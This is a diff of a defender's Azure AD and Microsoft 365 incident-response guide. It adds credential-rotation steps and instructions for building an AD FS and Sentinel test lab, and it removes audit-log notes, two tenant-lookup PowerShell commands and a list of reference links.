+* On-premises ADSync Service Account 
+* Reset local accounts on DCs
+* Rotate the AD FS token-signing and token-decrypting certificates 
+* Kerberos ticket granting ticket account twice 
+* Reset all service accounts 
+* Rotating secrets associated with remote access MFA token generation 
 
-** MailItemsAccessed  **
-* For customers with G5 or E5 licensing levels, the MailItemsAccessed log should show applications accessing users’ mailboxes. This log is enabled by default for users that are assigned an Office 365 or Microsoft 365 E5 license or for organizations with a Microsoft 365 E5 Compliance add-on subscription.  
-* The MailItemsAccessed mailbox auditing action covers all mail protocols: POP, IMAP, MAPI, EWS, Exchange ActiveSync, and REST.
-
-### Azure Sentinel data sources to configure
+## Azure Sentinel data sources to configure
 
 * AzureActiveDirectory (if not already onboarded to Azure Sentinel retained for 30 days in Azure Azure Active Directory)
   * Azure AD Audit Logs
@@ -258,48 +492,20 @@ Azure AD UserAuthenticationMethod: 16457 indicates a password with MFA was satis
 * Office365 - OfficeActivity (Exchange Online, OneDrive, Teams) (if not already onboarded to Sentinel retained for 90 days E3 / 1 year E5 in the Unified Audit Logs. These have to be manually enabled by the organisation.)
 * Microsoft 365 Defender - includes MDATP raw data
 * Microsoft Defender for Endpoint
-* AzureMonitor(IIS)
+* AzureMonitor (IIS)
 
-### Other useful commands
+## Notes on building a lab
 
-PS> Get-AADIntLoginInformation -Domain domain.com  
-PS> Get-AzureADTenantDetail | Select *  
-
-## Further references
-
-[Crowdstrike blog on hunting for modifications](https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/)
-* There is a good list in here of what to search for in Azure AD that goes further than the above including:
-  * Reviewing trust relationships with partners including IT consultants, vendors and resellers 
-  * Reviewing Azure AD allowed identity providers (SAML IDPs through direct federation or social logins)
-  * Reviewing Azure B2B external identities’ access to the Azure portal 
-  * Review environment for overly privileged service accounts that may have access to Azure
-
-[Microsoft blog explaining the difference between service principals and applicaitons](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)
-
-[Microsoft video on modern authentication methods including ADFS and SAML](https://twitter.com/SwiftOnSecurity/status/1217942428243632128?s=20) 
-
-[FireEye blog on carrying out attacks](https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html)
-
-https://www.youtube.com/watch?v=fpUZJxFK72k  
-
-https://dirkjanm.io/talks/  
-
-https://www.youtube.com/watch?v=SG2ibjuzRJM  
-
-https://www.youtube.com/watch?v=JEIR5oGCwdg  
-
-https://www.youtube.com/watch?v=LufXEPTlPak  
-
-https://vimeo.com/214855977  
-
-https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/  
-
-https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html
-
-https://www.youtube.com/watch?v=tJkjOnxcw6w
-
-https://i.blackhat.com/USA-20/Thursday/us-20-Bienstock-My-Cloud-Is-APTs-Cloud-Investigating-And-Defending-Office-365.pdf
-
-https://insen.github.io/blog/2017/09/24/Azure-AAD-with-Office-365/
-
-https://www.youtube.com/watch?v=zjezqZPPOfc
+* Purchase a test domain name. 
+* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
+* Configure an Azure AD tenant and configure the domain as a custom domain. 
+* Deploy three Windows Servers in Azure, and one test workstation. 
+* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
+* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
+* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
+* Configure 443 access to the WAP from the internet.
+* Configure Azure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
+* Configure the diagnostic settings for Azure AD to collect all logs data types. 
+* Enable audit logging in the Security & Compliance Center. 
+* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
+* Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the application. 
